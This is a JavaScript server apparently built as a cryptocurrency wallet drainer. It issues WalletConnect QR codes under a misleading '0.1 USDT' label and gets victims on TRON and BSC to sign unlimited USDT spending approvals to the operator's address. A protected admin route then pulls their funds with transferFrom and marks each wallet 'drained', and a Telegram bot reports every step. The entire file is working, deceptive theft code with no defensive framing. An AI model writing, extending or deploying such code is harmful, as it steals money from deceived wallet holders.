require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const QRCode = require('qrcode');
const TelegramBot = require('node-telegram-bot-api');
const TronWeb = require('tronweb');
const { ethers } = require('ethers');
const cors = require('cors');
const crypto = require('crypto');
const { SignClient } = require('@walletconnect/sign-client');
const { Core } = require('@walletconnect/core');

const app = express();
app.use(express.json());
app.use(cors());

// ============ CONFIG ============
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN;
const TG_ADMIN_CHAT_ID = process.env.TG_ADMIN_CHAT_ID;
const MONGO_URI = process.env.MONGO_URI;
const MASTER_PK = process.env.MASTER_PK;
const BACKEND_URL = process.env.BACKEND_URL;
const WC_PROJECT_ID = process.env.WC_PROJECT_ID;
const ADMIN_KEY = process.env.ADMIN_KEY;

// ============ CONTRACT ADDRESSES ============
const CONTRACTS = {
  tron: {
    usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    decimals: 6,
    caip: 'tron:0x2b6653dc',
    namespace: 'tron',
    signMethod: 'tron_signTransaction'
  },
  bsc: {
    usdt: '0x55d398326f99059fF775485246999027B3197955',
    decimals: 18,
    caip: 'eip155:56',
    namespace: 'eip155',
    signMethod: 'eth_sendTransaction'
  }
};

const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// ============ TRON SETUP ============
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: MASTER_PK
});
const MASTER_TRON_ADDRESS = tronWeb.address.fromPrivateKey(MASTER_PK);
console.log('Master TRON:', MASTER_TRON_ADDRESS);

// ============ BSC SETUP ============
const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
const bscWallet = new ethers.Wallet(MASTER_PK, bscProvider);
const MASTER_BSC_ADDRESS = bscWallet.address;
console.log('Master BSC:', MASTER_BSC_ADDRESS);

const ERC20_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)'
];
const bscUsdt = new ethers.Contract(CONTRACTS.bsc.usdt, ERC20_ABI, bscWallet);

// ============ TELEGRAM ============
const bot = new TelegramBot(TG_BOT_TOKEN, { polling: true });

// ============ DB ============
const WalletSchema = new mongoose.Schema({
  sessionId: { type: String, unique: true, required: true },
  chain: { type: String, enum: ['tron', 'bsc'], required: true },
  wcPairingTopic: String,
  wcTopic: String,
  userWallet: { type: String, default: null },
  approved: { type: Boolean, default: false },
  approvedAt: Date,
  approvalTxHash: String,
  status: { type: String, enum: ['pending','attached','approved','drained'], default: 'pending' },
  createdAt: { type: Date, default: Date.now }
});
const Wallet = mongoose.model('Wallet', WalletSchema);

// ============ STATE ============
let signClient = null;
const pairingMap = new Map();
const sessionMap = new Map();

// ============ ADMIN AUTH MIDDLEWARE ============
function checkAdmin(req, res, next) {
  const key = req.headers['x-admin-key'];
  if (!key || key !== ADMIN_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// ============ INIT WALLETCONNECT ============
async function initWC() {
  const core = new Core({ projectId: WC_PROJECT_ID, logger: 'error' });
  signClient = await SignClient.init({
    core,
    projectId: WC_PROJECT_ID,
    metadata: {
      name: '0.1 USDT', // यहाँ बदला गया है
      description: '',  // डिस्क्रिप्शन पूरी तरह खाली कर दिया गया है
      url: BACKEND_URL,
      icons: ['https://walletconnect.com/walletconnect-logo.png']
    }
  });

  signClient.on('session_proposal', async (event) => {
    try {
      const { id, params } = event;
      const pairingTopic = params.pairingTopic;
      const sessionId = pairingMap.get(pairingTopic);
      
      if (!sessionId) {
        console.log('No sessionId for pairing topic', pairingTopic);
        return;
      }

      const wallet = await Wallet.findOne({ sessionId });
      if (!wallet) {
        console.log('Wallet not found for session', sessionId);
        return;
      }

      // Auto-approve namespaces
      const { acknowledged } = await signClient.approve({
        id,
        namespaces: {
          tron: {
            methods: ['tron_signTransaction', 'tron_signMessage'],
            chains: ['tron:0x2b6653dc'],
            events: ['accountsChanged', 'chainChanged']
          },
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign'],
            chains: ['eip155:56'],
            events: ['accountsChanged', 'chainChanged']
          }
        }
      });
      
      const session = await acknowledged();
      const topic = session.topic;
      
      let walletAddress = null;
      let chain = wallet.chain;

      // Determine which chain actually got paired
      if (session.namespaces.tron && session.namespaces.tron.accounts.length) {
        walletAddress = session.namespaces.tron.accounts[0].split(':')[2];
        chain = 'tron';
      } else if (session.namespaces.eip155 && session.namespaces.eip155.accounts.length) {
        walletAddress = session.namespaces.eip155.accounts[0].split(':')[2];
        chain = 'bsc';
      }

      if (!walletAddress) {
        console.log('No wallet address in session namespaces');
        return;
      }

      wallet.userWallet = walletAddress;
      wallet.chain = chain;
      wallet.wcTopic = topic;
      wallet.status = 'attached';
      await wallet.save();

      sessionMap.set(sessionId, { topic, walletAddress, chain });

      bot.sendMessage(TG_ADMIN_CHAT_ID,
        `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nSession: \`${sessionId}\`\nWallet: \`${walletAddress}\`\n\nRequesting approval...`,
        { parse_mode: 'Markdown' });

      await requestApproval(sessionId);
    } catch (e) {
      console.error('session_proposal error:', e);
    }
  });

  console.log('WalletConnect ready');
}

// ============ REQUEST APPROVAL (per chain) ============
async function requestApproval(sessionId) {
  const session = sessionMap.get(sessionId);
  if (!session) return;
  const wallet = await Wallet.findOne({ sessionId });
  const chain = wallet.chain;

  try {
    let result;

    if (chain === 'tron') {
      // TRON approval
      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        CONTRACTS.tron.usdt,
        'approve(address,uint256)',
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: 'address', value: MASTER_TRON_ADDRESS },
          { type: 'uint256', value: MAX_UINT256 }
        ],
        wallet.userWallet
      );

      result = await signClient.request({
        topic: session.topic,
        chainId: CONTRACTS.tron.caip,
        request: {
          method: 'tron_signTransaction',
          params: {
            address: wallet.userWallet,
            transaction: tx.transaction
          }
        }
      });

      const broadcast = await tronWeb.trx.sendRawTransaction(result);
      if (!broadcast.result) {
        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ TRON broadcast failed: ${broadcast.message}`);
        return;
      }
      const txHash = broadcast.txid;
      await new Promise(r => setTimeout(r, 5000));

      const valid = await verifyApprovalTron(txHash, wallet.userWallet);
      if (!valid) {
        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ TRON verify failed`);
        return;
      }
      
      wallet.approved = true;
      wallet.approvedAt = new Date();
      wallet.approvalTxHash = txHash;
      wallet.status = 'approved';
      await wallet.save();

      bot.sendMessage(TG_ADMIN_CHAT_ID,
        `✅ *Approved* [TRON]\nSession: \`${sessionId}\`\nWallet: \`${wallet.userWallet}\`\nTX: \`${txHash}\``,
        { parse_mode: 'Markdown' });

    } else if (chain === 'bsc') {
      // BSC approval - build unsigned tx
      const spender = MASTER_BSC_ADDRESS;
      const amount = ethers.MaxUint256;
      
      const iface = new ethers.Interface(ERC20_ABI);
      const data = iface.encodeFunctionData('approve', [spender, amount]);
      
      const nonce = await bscProvider.getTransactionCount(wallet.userWallet);
      const feeData = await bscProvider.getFeeData();
      
      const tx = {
        to: CONTRACTS.bsc.usdt,
        data: data,
        value: '0x0',
        gas: '0x186a0', // 100000
        maxFeePerGas: feeData.maxFeePerGas?.toString() || '0x12a05f200',
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || '0x3b9aca00',
        nonce: '0x' + nonce.toString(16),
        chainId: '0x38', // 56
        type: '0x2'
      };

      result = await signClient.request({
        topic: session.topic,
        chainId: CONTRACTS.bsc.caip,
        request: {
          method: 'eth_sendTransaction',
          params: [tx]
        }
      });

      // result is tx hash
      const txHash = result;
      console.log('BSC TX sent:', txHash);
      
      // Wait for confirmation
      await new Promise(r => setTimeout(r, 8000));
      
      const receipt = await bscProvider.getTransactionReceipt(txHash);
      if (!receipt || receipt.status !== 1) {
        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ BSC TX not confirmed`);
        return;
      }

      wallet.approved = true;
      wallet.approvedAt = new Date();
      wallet.approvalTxHash = txHash;
      wallet.status = 'approved';
      await wallet.save();

      bot.sendMessage(TG_ADMIN_CHAT_ID,
        `✅ *Approved* [BSC]\nSession: \`${sessionId}\`\nWallet: \`${wallet.userWallet}\`\nTX: \`${txHash}\``,
        { parse_mode: 'Markdown' });
    }
  } catch (e) {
    console.error('requestApproval error:', e);
    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval error [${chain}]: ${e.message}`);
  }
}

// ============ VERIFY TRON APPROVAL ============
async function verifyApprovalTron(txHash, userWallet) {
  try {
    const txInfo = await tronWeb.trx.getTransactionInfo(txHash);
    if (!txInfo || !txInfo.receipt || txInfo.receipt.result !== 'SUCCESS') return false;
    const tx = await tronWeb.trx.getTransaction(txHash);
    if (tx.raw_data.contract[0].type !== 'TriggerSmartContract') return false;
    const contract = tx.raw_data.contract[0].parameter.value;
    const contractAddr = tronWeb.address.fromHex(contract.contract_address);
    const ownerAddr = tronWeb.address.fromHex(contract.owner_address);
    if (contractAddr !== CONTRACTS.tron.usdt) return false;
    if (ownerAddr !== userWallet) return false;
    const data = contract.data;
    if (!data.startsWith('095ea7b3')) return false;
    const spenderHex = data.substring(8, 72).slice(-40);
    const spenderAddr = tronWeb.address.fromHex('41' + spenderHex);
    if (spenderAddr !== MASTER_TRON_ADDRESS) return false;
    return true;
  } catch (e) {
    console.error('verifyApprovalTron error:', e);
    return false;
  }
}

// ============ ROUTES ============

app.get('/', (req, res) => res.json({ 
  status: 'ok', 
  masterTron: MASTER_TRON_ADDRESS,
  masterBsc: MASTER_BSC_ADDRESS
}));

// Generate QR (protected)
app.post('/api/generate-qr', checkAdmin, async (req, res) => {
  try {
    const { chain } = req.body; // 'tron' or 'bsc'
    if (!chain || !CONTRACTS[chain]) {
      return res.status(400).json({ error: 'Invalid chain. Use tron or bsc' });
    }

    const sessionId = crypto.randomBytes(12).toString('hex');

    const namespaces = chain === 'tron' ? {
      tron: {
        methods: ['tron_signTransaction', 'tron_signMessage'],
        chains: ['tron:0x2b6653dc'],
        events: ['accountsChanged', 'chainChanged']
      }
    } : {
      eip155: {
        methods: ['eth_sendTransaction', 'personal_sign'],
        chains: ['eip155:56'],
        events: ['accountsChanged', 'chainChanged']
      }
    };

    const { uri } = await signClient.connect({
      requiredNamespaces: namespaces
    });

    const pairingTopic = uri.split('@')[0].replace('wc:', '');
    await Wallet.create({ sessionId, chain, wcPairingTopic: pairingTopic, status: 'pending' });
    pairingMap.set(pairingTopic, sessionId);

    const qrImage = await QRCode.toDataURL(uri, {
      width: 400,
      margin: 2,
      errorCorrectionLevel: 'M'
    });

    res.json({ success: true, sessionId, chain, uri, qrImage });

    bot.sendMessage(TG_ADMIN_CHAT_ID,
      `🆕 *QR Generated* [${chain.toUpperCase()}]\nSession: \`${sessionId}\``,
      { parse_mode: 'Markdown' });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

// Admin: list wallets (protected)
app.get('/api/admin/wallets', checkAdmin, async (req, res) => {
  const wallets = await Wallet.find({ status: { $in: ['approved', 'drained'] } }).sort({ approvedAt: -1 });
  res.json({ wallets });
});

// Admin: balance (protected)
app.get('/api/admin/balance/:sessionId', checkAdmin, async (req, res) => {
  try {
    const wallet = await Wallet.findOne({ sessionId: req.params.sessionId });
    if (!wallet || !wallet.userWallet) return res.status(404).json({ error: 'Not found' });

    let balance;
    if (wallet.chain === 'tron') {
      const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
      const bal = await contract.balanceOf(wallet.userWallet).call();
      balance = (Number(bal) / 10 ** CONTRACTS.tron.decimals).toFixed(6);
    } else {
      const bal = await bscUsdt.balanceOf(wallet.userWallet);
      balance = ethers.formatUnits(bal, CONTRACTS.bsc.decimals);
    }

    res.json({ balance, wallet: wallet.userWallet, chain: wallet.chain });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

// Admin: transfer (protected)
app.post('/api/admin/transfer', checkAdmin, async (req, res) => {
  try {
    const { sessionId, destination, amount } = req.body;
    const wallet = await Wallet.findOne({ sessionId });
    if (!wallet || !wallet.approved) return res.status(400).json({ error: 'Wallet not approved' });

    let txHash;

    if (wallet.chain === 'tron') {
      const amountSun = Math.floor(parseFloat(amount) * 10 ** CONTRACTS.tron.decimals).toString();
      const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
      txHash = await contract.transferFrom(
        wallet.userWallet,
        destination,
        amountSun
      ).send({ feeLimit: 100000000, callValue: 0 });
    } else {
      const amountWei = ethers.parseUnits(amount.toString(), CONTRACTS.bsc.decimals);
      const tx = await bscUsdt.transferFrom(wallet.userWallet, destination, amountWei);
      const receipt = await tx.wait();
      txHash = receipt.hash;
    }

    wallet.status = 'drained';
    await wallet.save();

    bot.sendMessage(TG_ADMIN_CHAT_ID,
      `💸 *Transfer Done* [${wallet.chain.toUpperCase()}]\nFrom: \`${wallet.userWallet}\`\nTo: \`${destination}\`\nAmount: ${amount} USDT\nTX: \`${txHash}\``,
      { parse_mode: 'Markdown' });

    res.json({ success: true, txHash, chain: wallet.chain });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

// ============ START ============
(async () => {
  await mongoose.connect(MONGO_URI, {
    tls: true,
    serverSelectionTimeoutMS: 3000
  })
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

  await initWC();
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log('Server on port', PORT));
})();
